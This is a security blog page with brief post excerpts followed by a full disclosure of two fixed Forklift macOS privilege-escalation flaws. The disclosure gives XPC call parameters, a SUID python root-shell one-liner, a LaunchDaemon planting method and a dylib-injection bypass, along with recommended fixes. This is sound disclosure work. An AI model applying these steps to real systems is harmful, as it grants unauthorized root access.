## [Forklift <=3.3.9 and <=3.4 Local Privilege Escalations on macOS (CVE-2020-15349/CVE-2020-27192)](https://insinuator.net/2020/11/forklift-lpe/)

I have started to have a look at my local installed helpers on macOS. These helpers are used as an interface for applications to perform privileged operations on the system. Thus, it is quite a nice attack surface to search for Local Privilege Escalations.

Forklift is an advanced dual pane file manager for macOS. It is well known under macOS power users.

As part of my investigation I identified vulnerabilities in Forklift allowing local privilege escalation.

By now all vulnerabilities are fixed by the vendor I can release the details: <https://binarynights.com/versionhistory>

## [Spraying arbitrary objects into the non-paged pool](https://insinuator.net/2018/10/spraying-arbitrary-objects-into-the-non-paged-pool/)

Recently, I had some time to play around with HEVD [[1](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)], an extremly vulnerable Windows driver available for 32-bit and 64-bit systems.

Since exploits for all vulnerabilities of the 32-bit variant are publically available, I was wondering why this is not the case for the 64-bit version, especially for the pool corruption and UAF vulnerabilities.

## [Cloudflare Incident #Cloudbleed](https://insinuator.net/2017/02/cloudflare-incident-cloudbleed/)

Exactly one week ago I noticed an “urgent” tweet from Tavis Ormandy to get in contact with the Cloudflare team.

Normally when a tweet like this appears from Tavis, something is horribly broken. Well, today we know the background of this tweet as the [bug tracker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1139) issue went public and it exposed quite a bug from Cloudflare.

## [Insomni’hack pwn50 write-up](https://insinuator.net/2017/01/insomnihack-pwn50-write-up/)

Hi all,

i´ve looked a bit at the [Insomni’hack CTF](https://insomnihack.ch/?page_id=16) which took place on the 21st January and lasted for 36 hours.

For the sake of warming up a bit for our Troopers workshop [Windows and Linux Exploitation](https://www.troopers.de/events/troopers17/728_windows_and_linux_exploitation/),

I decided to create a write-up of the first pwn50 challenge.

To grab your own copy of the presented files you can also find it in our [Github](https://github.com/ernw/insinuator-snippets/tree/master/Insomnihack) repository:

Just a few days ago I had the pleasure of visiting [Day-Con X](http://day-con.org/). I listened to some great talks in the closed and public sessions. Since the first day was the security summit (closed session) I will just name a few titles with some brief words.

## [Black Hat 2016 Summary](https://insinuator.net/2016/08/black-hat-2016-summary/)

Just a few days ago I had a blast again at this year’s Black Hat. Some of the talks were really worth listening to, so I wanted to point them out and give a short summary.

[USING UNDOCUMENTED CPU BEHAVIOR TO SEE INTO KERNEL MODE AND BREAK KASLR IN THE PROCESS](https://www.blackhat.com/us-16/briefings.html#using-undocumented-cpu-behavior-to-see-into-kernel-mode-and-break-kaslr-in-the-process) – Anders Fogh & Daniel Gruss

They had the last slot at the last day of Black Hat which resulted in a kind of empty room, but in my opinion it was an awesome talk and I even had the pleasure to meet these two guys at our ERNW dinner.

The talk was about a very weirdly documented Intel instruction which does not check for privileges or throw exceptions:

## [Keynote #1 Troopers 2016](https://insinuator.net/2016/03/keynote-1-troopers-2016/)

The first Keynote directly after the Opening by Enno Rey was held by Ben Zevenbergen. At the beginning he pointed out that he is not a very technical guy rather he specialized in Information Law and a policy advisor to the European Parliament. Before he started to dive into his Keynote he talked about some rant story’s which happened to him while trying to make his point clear on previous conferences and that he came in peace to Troopers ;).

## [Attacking Next-Generation Firewalls](https://insinuator.net/2016/03/attacking-next-generation-firewalls/)

Felix Wilhelm presented in his talk various ways to attack his new target – The PA-500 which is produced by Palo Alto Networks.

He discovered vulnerabilities in 3 different exposed aspects of the device. The first vulnerability occurred inside of an unauthenticated API from the Management-Website which could only be accessed within the Admin Network. This vulnerability was a typical off-by-one Command Injection, which could be abused by reaching out to the API with a special client=wget Request.

## [Dynamic IDA Enrichment (aka. DIE)](https://insinuator.net/2016/01/die/)

Last year on the [Hex-rays plugin Contest](https://hex-rays.com/contests/2015/index.shtml) the Dynamic IDA Enrichment (DIE) plugin won first place, so we decided to have a look and play around with it.

DIE extends IDA to add Dynamic Data to the static analysis. So after the installation, we are able to perform the static analysis using a lot of supporting information from the actual execution of the binary under assessment.

Since DIE is purely written in Python you will need at least Python 2.7 and IDA Versions prior to 6.8 won´t work. In the current version DIE will only work on Windows which will hopefully soon be available cross-platform.

To setup the environment for DIE just use pip install –r requirements.txt (requirements.txt are shipped with DIE).

Copy die\_proxy.py to the IDA Plugin directory and add an environment Variable named DIEDIR including the path to the DIE directory. [Continue reading “Dynamic IDA Enrichment (aka. DIE)”](https://insinuator.net/2016/01/die/#more-5778)

# Forklift <=3.3.9 and <=3.4 Local Privilege Escalations on macOS (CVE-2020-15349/CVE-2020-27192)

I have started to have a look at my local installed helpers on macOS. These helpers are used as an interface for applications to perform privileged operations on the system. Thus, it is quite a nice attack surface to search for Local Privilege Escalations.

Forklift is an advanced dual pane file manager for macOS. It is well known under macOS power users.

As part of my investigation I identified vulnerabilities in Forklift allowing local privilege escalation.

By now all vulnerabilities are fixed by the vendor I can release the details: <https://binarynights.com/versionhistory>

# **Forklift 3.3.9 Local Privilege Escalation CVE-2020-15349**

When installing the Forklift, a new helper called *com.binarynights.ForkLiftHelper* for Mac OS X is automatically installed to the */Library/PrivilegedHelperTools/* directory.

Analyzing this helper, which handles XPC messages, resulted in different ways of escalating privileges from user to *root* on Mac OS X.

When accepting XPC calls the `HelperTool listener:shouldAcceptNewConnection` respectively `(BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)connection` function by default. This function is used to perform the initial steps for establishing an XPC connection. Usually, this function performs the authorization of the caller—however, the function of the *com.binarynights.ForkLiftHelper* does not implement any authorization checks. Thus, it is possible to call any exposed functions over XPC unauthorized.

The following functions are exposed over XPC to the caller:

`@protocol _TtP4main21ForkLiftHelperProtcol_

- (void)changePermissions:(NSString *)arg1 permissions:(long long)arg2 reply:(void (^)(NSError *))arg3;

- (void)changeOwner:(NSString *)arg1 owner:(long long)arg2 group:(long long)arg3 reply:(void (^)(NSError *))arg4;

- (void)calculateDirectorySize:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;

- (void)createDirectory:(NSString *)arg1 reply:(void (^)(NSError *))arg2;

- (void)deleteItem:(NSString *)arg1 reply:(void (^)(NSError *))arg2;

- (void)moveItem:(NSString *)arg1 targetPath:(NSString *)arg2 reply:(void (^)(NSError *))arg3;

- (void)copyItemAbort:(NSString *)arg1;

- (void)copyItemProgress:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;

- (void)copyItem:(NSString *)arg1 targetPath:(NSString *)arg2 UUID:(NSString *)arg3 reply:(void (^)(NSError *))arg4;

- (void)moveToTrash:(NSString *)arg1 reply:(void (^)(NSError *))arg2;

- (void)getHelperVersion:(void (^)(NSString *))arg1;

@end`

## Setuid Exploitation

The first method to exploit this helper is as follows:
### Step 1: Interpreter Target chown

Copy, for example, the python interpreter to a user-controllable directory and call the XPC function *changeOwner* with the parameter `@"<path>" owner:0 group:0`. This will change the ownership of the python interpreter to *root*.
### Step 2: Set SUID flag

Second, it is possible to set the SUID bit to the interpreter issuing an XPC request to the *changePermissions* function with the following parameter `@"<path>" permissions:2541`. The permissions *2541* represent in octal the number *4755*, which sets the SUID flag on the binary.
### Step 3: LPE

The following command will spawn a shell as root:

`$/tmp/python_copied -c 'import pty; import os; os.setuid(0);pty.spawn("/bin/bash")'`
# id
uid=0(root) […]

### Full Exploit

Please make sure to first have a python interpreter copied to */tmp* with the name *python\_copied*.
A working exploit can be found [here](https://github.com/Traxes/Forklift_LPE/blob/main/exploit.m).

## LaunchAgent Exploitation

The second method to exploit this helper is as follows:
### Writing a new Launch Agent

Due to the XPC call *moveItem* it is possible to move any item as *root*. Thus, it is possible to write a *plist* file to the */tmp* directory and then copy it to the */Library/LaunchDaemons/* directory. The following parameters are used for the *moveItem* function `@"/tmp/com.sample.Load.plist" targetPath:@"/Library/LaunchDaemons/com.sample.Load.plist"`

### Full Exploit

The exploit can be found [here](https://github.com/Traxes/Forklift_LPE/blob/main/exploit_move_item.m) and automatically adds a new launch agent which is triggered at a restart:

### Recommendation

It is recommended to enforce authorization when calling the XPC helper.
These authorization checks should contain:
– The caller is a valid signed application
– The caller application was well hardened against DYLIB injection attacks (runtime flag)
– The caller application has the correct TeamID from the Software Company
An excellent resource for the authorization checks can be found at <https://blog.obdev.at/what-we-have-learned-from-a-vulnerability/>.
The following example *shouldAcceptNewConnecton* functions displays the different stages of the correct authorization checks:

## Partial Fix

When reviewing the first fix for the issue by the vendor, it was noticed that they forgot to implement a check in the helper if the caller is compiled with the runtime flag (e.g., *0x1000).* Thus, it is possible to load an older version of Forklift, and Inject a library with the presented DYLD injection method and exploit the very same problem.

This problem was also noticed by Csaba Fitzl (Twitter: [@theevilbit](https://theevilbit.github.io/)). Huge shoutout to him as I learned a lot from his excellent resources!

# Entitlements LPE CVE-2020-27192

Now the current measures that are in place are checking whether the Forklift application itself is calling the helper.
It is possible to bypass this using a technique called *Dylib* injection. The operating system has a load order where the OS will try to load *dylib* libraries from different resources from the file system or sometimes even by environment variables.

Forklift is compiled with the following runtime flags:

`codesign -dvvvv /Applications/ForkLift.app/Contents/MacOS/ForkLift
Executable=/Applications/ForkLift.app/Contents/MacOS/ForkLift
Identifier=com.binarynights.ForkLift-3
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=27271 flags=0x10000(runtime) hashes=843+5 location=embedded`

The system will prevent such *dylib* loading from happening. However, there is a catch which disables these hardening features which is called the entitlement. Entitlements can bypass this loading prevention and unfortunately forklift uses the entitlement to disable library validation by default.

The following displays that:

`jtool2 --ent /Applications/ForkLift.app/Contents/MacOS/ForkLift
Note: 15214 symbols detected in this file! This will take a little while - generate a companion file or use '-q' for quick mode..
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ["http://www.apple.com/DTDs/PropertyList-1.0.dtd"](http://www.apple.com/DTDs/PropertyList-1.0.dtd)>
<plist version="1.0">
<dict>
    <key>com.apple.security.application-groups</key>
    <array>
        <string>J3CP9BBBN6.com.binarynights.ForkLift</string>
    </array>
    <key>com.apple.security.automation.apple-events</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key> <------
    <true/>
    <key>com.apple.security.personal-information.photos-library</key>
    <true/>
</dict>
</plist>`

This is the same for the helper:

`jtool2 --ent /Library/PrivilegedHelperTools/com.binarynights.ForkLiftHelper
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ["http://www.apple.com/DTDs/PropertyList-1.0.dtd"](http://www.apple.com/DTDs/PropertyList-1.0.dtd)>
<plist version="1.0">
<dict>
    <key>com.apple.security.automation.apple-events</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>    <-------
    <true/>
    <key>com.apple.security.personal-information.photos-library</key>
    <true/>
</dict>
</plist>`

Thus, it is possible to inject a library at load time of forklift which connects to the XPC helper service and exploits the same vulnerability as previously.
This attack is described in detail at the following blogposts:

– <https://objective-see.com/blog/blog_0x56.html>
– <https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/>
– <https://secret.club/2020/08/14/macos-entitlements.html>
### Recommendation

It is recommended to not have the entitlement *com.apple.security.cs.disable-library-validation* in your application. Further, it is recommended to check whether the entitlements are securely set.

# Final Words

I have to add that the communication with the vendor was very responsive, and even when they had a hard time implementing all recommended controls, they were all the time very professional! Thus, I will for sure further use this excellent file viewer.

Cheers,

Birk
